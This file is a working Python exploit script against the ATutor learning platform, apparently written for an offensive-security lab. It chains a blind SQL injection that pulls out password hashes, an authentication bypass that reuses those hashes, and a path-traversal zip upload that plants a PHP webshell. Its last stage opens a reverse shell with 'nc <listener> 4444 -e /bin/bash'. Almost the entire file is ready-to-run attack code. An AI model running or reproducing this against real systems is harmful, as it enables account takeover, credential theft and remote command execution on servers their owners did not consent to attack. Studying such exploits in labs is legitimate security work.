import sys
import re
import os
import hashlib
import requests
import threading
import urllib.parse
import argparse
import zipfile
from io import BytesIO
from bs4 import BeautifulSoup
from colorama import Fore, Style

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def format_text(title, item):
    text = Style.BRIGHT + Fore.RED + title + Style.RESET_ALL + ': ' + str(item)
    return text

def searchFriends_sqli(ip, inj_str, print_result):
    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}"
    r = requests.get(target)
    bs_r_text = BeautifulSoup(r.text, 'lxml').text
    
    if print_result:
        for key, value in r.headers.items():
            print(format_text(f'r.headers[{key}]', value))
        print(format_text('r.status_code', r.status_code))
        print(format_text('bs_r_dot_text', bs_r_text))
    
        error = re.search("Invalid argument", bs_r_text)
        if error:
            print("\n[+] Errors found in response. Possible SQL injection found")
        else:
            print("[-] No errors found")
        
    if int(r.headers['Content-Length']) > 30:
        return True
    else:
        return False

def parse_injection_string(inj_str):
    inj_str = inj_str.replace(' ', '/**/')
    inj_str = urllib.parse.quote(inj_str)
    
    return inj_str

def boolean_based_get_output(ip, select_string, ascii_list=[num for num in range(32, 126)]):
    result_string = ""
    string_end = False
    for i in range(1, 99):
        for a in ascii_list:
            select_injection_string = "AAAA') or ascii(substring((" + select_string + "),{},1))={}#".format(i, a)
            select_injection_string = parse_injection_string(select_injection_string)
             
            if searchFriends_sqli(ip, select_injection_string, False):
                result_string += chr(a)
                break
            if a == 125:
                string_end = True
                break
        print("[+] {}".format(result_string))
        if string_end == True:
            break

    return result_string

character_list = ["_"] * 40
def boolean_based_get_hash(ip, select_string):
    global character_list

    ascii_list = [num for num in range(48, 58)] + [num for num in range(97, 103)]
    string_end = False

    threads = []
    for i in range(1, 41):
        t = threading.Thread(target=boolean_based_get_hash_call, args=(ip, select_string, i, ascii_list,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    result_string = "".join(character_list)
    character_list = ["_"] * 40
    return result_string

def boolean_based_get_hash_call(ip, select_string, i, ascii_list):
    global character_list

    for a in ascii_list:
        select_injection_string = "AAAA') or ascii(substring((" + select_string + "),{},1))={}#".format(i, a)
        select_injection_string = parse_injection_string(select_injection_string)
         
        if searchFriends_sqli(ip, select_injection_string, False):
            character_list[i-1] = chr(a)
            print("{}".format("".join(character_list)))
            return
    
    return -1

def calculate_sha1(text):
    sha1_hash = hashlib.sha1(text.encode()).hexdigest()
    return sha1_hash

def authenticate(ip, auth_hash, token, user_type):
    url = "http://{}/ATutor/login.php".format(ip)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "1"
    }
    data = {
        "form_login_action": "true",
        "form_course_id": "0",
        "form_password_hidden": auth_hash,
        "p": "",
        "form_login": user_type,
        "form_password": "",
        "submit": "Login",
        "token": token
    }
    r = requests.post(url, headers=headers, data=data, proxies=proxies)
    bs_r_text = BeautifulSoup(r.text, 'lxml').text
    session_cookie = r.cookies.get("ATutorID")

    print(format_text('r.headers["Set-Cookie"]', r.headers["Set-Cookie"]))
    if "Create Course: My Start Page" in bs_r_text or "My Courses: My Start Page" in bs_r_text:
        course_id = r.text.split('<img src="get_course_icon.php?id=')[1].split('"')[0]
        return session_cookie, course_id
    else:
        return -1, -1

def auth_bypass(ip, user_type="teacher"):
    ascii_list_for_hash = [num for num in range(48, 58)] + [num for num in range(97, 103)]
    if user_type == "teacher":
        user_hash = boolean_based_get_hash(ip, "select password from AT_members where login=\"teacher\"")
    else:
        user_hash = boolean_based_get_hash(ip, "select password from AT_admins where login=\"admin\"")

    print("[+] The password hash of {} is {}.".format(user_type, user_hash))
    token = "hacked"
    auth_hash = calculate_sha1(user_hash + token)
    user_session, course_id = authenticate(ip, auth_hash, token, user_type)
    if user_session != -1:
        print("[+] Authentication successful! The session cookie is {}".format(user_session))
        return user_session, course_id
    else:
        print("[-] Authentication unsuccessful...")
        return -1, -1

def get_web_root(ip):
    url = 'http://{}/ATutor/browse.php'.format(ip)
    params = {
        'access': '',
        'search[]': 'test',
        'include': 'all',
        'filter': 'Filter'
    }
    r = requests.get(url, params=params, proxies=proxies)
    web_root = r.text.split("urlencode() expects parameter 1 to be string, array given in <b>")[1].split("/ATutor/include/html/browse.inc.php")[0]
    return web_root

def build_zip_file(ip):
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)

    web_root = get_web_root(ip)
    z.writestr('../../../../..' + web_root + '/ATutor/mods/poc/poc.phtml', '<?=`$_GET[0]`?>')
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    with open('poc.zip', 'wb') as zip_file:
        zip_file.write(f.getvalue())
        print("[+] Zip file successfully built at {}".format(os.getcwd() + "/poc.zip"))

def upload_webshell(ip, teacher_session, course_id):


    headers = {
        'Cookie': 'ATutorID=' + teacher_session,
        "User-Agent": "1"
    }
    url = 'http://{}/ATutor/bounce.php?course={}'.format(ip, course_id)
    r = requests.get(url, headers=headers, proxies=proxies, allow_redirects=False)

    zip_file_path = os.path.join(os.getcwd(), 'poc.zip')
    teacher_session = r.headers['Set-Cookie'].split(';')[0]
    headers = {
        'Cookie': teacher_session,
        "User-Agent": "1"
    }
    files = {
    'file': ('poc.zip', open(zip_file_path, 'rb'), 'application/zip'),
    'submit_import': (None, 'Import')
    }
    url = 'http://{}/ATutor/mods/_standard/tests/import_test.php'.format(ip)
    r = requests.post(url, files=files, headers=headers, allow_redirects=False, proxies=proxies)
    r_text = r.text
    if "XML error: Not well-formed" in r.text:
        print("[+] Webshell upload successful! It is now located at https://{}/ATutor/mods/poc/poc.phtml".format(ip))
        print("[+] You can execute command with https://{}/ATutor/mods/poc/poc.phtml?0=<cmd>".format(ip))
    else:
        print("[+] Failed to upload webshell...")

class NewlineFormatter(argparse.RawTextHelpFormatter):
    def _split_lines(self, text, width):
        if text.startswith('R|'):
            return text[2:].splitlines()  
        return argparse.RawTextHelpFormatter._split_lines(self, text, width)

def main():
    parser = argparse.ArgumentParser(description='''
    Usage examples:
      - To verify if the application is vulnerable:
        python script.py -i <IP> -s verify
      - To get the SQL version of the application:
        python script.py -i <IP> -s get_version
      - To get a reverse shell:
        python script.py -i <IP> -s reverse_shell -l <Listener IP>

    The script supports the following stages:
      - "verify": Verify if the application is vulnerable.
      - "get_version": Get the SQL version of the application.
      - "get_user": Get the current user of the database.
      - "get_teacher_hash": Get the password hash of the user "teacher".
      - "get_admin_hash": Get the password hash of the user "admin".
      - "auth_bypass_teacher": Bypass authentication and login as "teacher".
      - "get_web_root": Get the web root of the application.
      - "build_zip_file": Build the zip file that contain a webshell phtml file.
      - "upload_webshell": Build the webshell zip file, bypass authentication and upload the webshell.
      - "reverse_shell": Build the webshell zip file, bypass authentication, upload webshell and execute a reverse shell payload.
    ''', formatter_class=NewlineFormatter)
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP Address is mandatory')
    parser.add_argument('-c', '--command', type=str, help='Injection Command')
    parser.add_argument('-s', '--stage', type=str, help='Stage')
    parser.add_argument('-l', '--listener', type=str, help='Listener IP')
    args = parser.parse_args()
    
    if not args.ip:
        parser.print_usage()
        exit(1)
        
    elif args.ip and args.command:
        ip = args.ip
        injection_string = parse_injection_string(args.command)
        searchFriends_sqli(ip, injection_string, True)
        
    elif args.ip and args.stage:
        ip = args.ip
        stage = args.stage
        
        if stage == "verify":
            false_injection_string = parse_injection_string("test') or (select 1)=0#")
            true_injection_string = parse_injection_string("test') or (select 1)=1#")
             
            true_injection_result = searchFriends_sqli(ip, true_injection_string, False)
            false_injection_result = searchFriends_sqli(ip, false_injection_string, False)
             
            if true_injection_result == True and false_injection_result == False:
                print("[+] the target is vulnerable!")
            else:
                print("[+] the target is not vulnerable.")
        
        elif stage == "get_version":
            version_string = boolean_based_get_output(ip, "select version()")
            print("[+] The MySQL version is {}.".format(version_string))

        elif stage == "get_user":
            user_string = boolean_based_get_output(ip, "select current_user()")
            print("[+] The current user is {}.".format(user_string))

        elif stage == "get_teacher_hash":
            teacher_hash = boolean_based_get_hash(ip, "select password from AT_members where login=\"teacher\"")
            print("[+] The password hash of \"teacher\" is {}.".format(teacher_hash))

        elif stage == "get_admin_hash":
            admin_hash = boolean_based_get_hash(ip, "select password from AT_admins where login=\"admin\"")
            print("[+] The password hashof \"admin\" is {}.".format(admin_hash))

        elif stage == "auth_bypass_teacher":
            teacher_session, course_id = auth_bypass(ip, "teacher")

        elif stage == "get_web_root":
            web_root = get_web_root(ip)
            print("[+] The web root is {}".format(web_root))

        elif stage == "build_zip_file":
            build_zip_file(ip)

        elif stage == "upload_webshell":
            build_zip_file(ip)
            teacher_session, course_id = auth_bypass(ip, "teacher")
            upload_webshell(ip, teacher_session, course_id)

        elif stage == "reverse_shell":
            if not args.listener:
                print("[-] Listener IP must be provided. E.g. python script.py -i 192.168.195.103 -s reverse_shell -l 192.168.195.101")
            else:
                listener_ip = args.listener
                build_zip_file(ip)
                teacher_session, course_id = auth_bypass(ip, "teacher")
                upload_webshell(ip, teacher_session, course_id)
                url = "http://{}/ATutor/mods/poc/poc.phtml?0=nc%20{}%204444%20-e%20/bin/bash".format(ip, listener_ip)
                print("[+] Reverse shell triggered! Have you set up your listener?")
                print("[+] nc -nvlp 4444")
                r = requests.get(url)
                print("[+] Bye!")

    else:
        ip = args.ip
        injection_string = "'"
        searchFriends_sqli(ip, injection_string, True)
    

if __name__ == "__main__":
    main()
